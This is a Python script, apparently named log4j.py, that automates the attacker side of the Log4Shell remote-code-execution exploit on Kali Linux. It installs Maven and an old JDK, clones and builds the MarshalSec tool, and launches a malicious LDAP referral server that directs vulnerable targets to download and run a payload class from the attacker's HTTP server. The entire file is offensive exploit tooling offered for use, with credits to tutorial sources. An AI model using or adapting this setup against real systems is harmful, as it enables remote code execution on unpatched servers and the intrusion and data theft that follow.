import subprocess
from os import path
import os
import sys
from ipaddress import IPv4Address


try:
    print(f"{IPv4Address(sys.argv[1])}")
    ip_addr = sys.argv[1]
    print("Valid ip address entered through command-line.")
except:
    print("Run program with command-line argument for ip address. Please re-run the program. Example would be python3 log4j.py 192.168.1.132")
    exit()

#. Update Linux Distro
print("**Updating Kali!**\n")
subprocess.run(["sudo", "apt", "update"])

# Install Maven
try:
    mvn_check = subprocess.run(["mvn", "--version"], capture_output=True)
    print("\n**Apache Maven already installed! Continuing!\n**")
except:
    print("\n**Installing Maven!**\n")
    subprocess.run(["sudo", "apt", "install", "maven"])


print("\nChecking JDK Version\n")
try:
    jdk_check = subprocess.run(["javac", "-version"], capture_output=True)
    print("\n**JDK already installed! Continuing!\n**")
except:
    print("\n**Downloading JDK**\n")
    subprocess.run(["wget", "https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz"])
    

#Install JDK
    #   Check if directory /opt/jdk exists. 
    if path.exists("/opt/jdk"):
        print("/opt/jdk already exists. Will now continue to extract.")
    else:
        subprocess.run(["sudo", "mkdir", "/opt/jdk"])
        subprocess.run(["sudo", "tar", "-zxf", "jdk-8u181-linux-x64.tar.gz", "-C", "/opt/jdk"])
        subprocess.run(["sudo", "update-alternatives", "--install", "/usr/bin/java", "java", "/opt/jdk/jdk1.8.0_181/bin/java", "100"])
        subprocess.run(["sudo", "update-alternatives", "--install", "/usr/bin/javac", "javac", "/opt/jdk/jdk1.8.0_181/bin/javac", "100"])
        subprocess.run(["sudo", "update-alternatives", "--display", "java"])
        subprocess.run(["sudo", "update-alternatives", "--display", "javac"])
        subprocess.run(["sudo", "update-alternatives", "--set", "/opt/jdk/jdk1.8.0_181/bin/java"])
        subprocess.run(["java", "-version"])

# Get MarshalSec repo
subprocess.run(["git", "clone", "https://github.com/mbechler/marshalsec.git"])

# Change directory
cwd = os.getcwd()
os.chdir("./marshalsec/")
print(os.listdir())
subprocess.run(["mvn", "clean", "package", "-DskipTests"])

# Run LDAP server. In terminal you need to add "" around the ip address. In subprocess.run this is not required.
try:
    subprocess.run(["java", "-cp", "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", f"http://{ip_addr}:8888/#Log4jRCE"])
except:
    print("Something went wrong. Please check that you have the correct ip address")
    
# We want to thank the following people for their contribution: 
# John Hammond : https://youtu.be/7qoPDq41xhQ
# Moritz Bechler (For creating the Java Unmarshaller Security - MarshalSec) : https://github.com/mbechler/marshalsec
# xiajun325 for clear instruction on how to use the MarshalSec tool : https://github.com/xiajun325/apache-log4j-rce-poc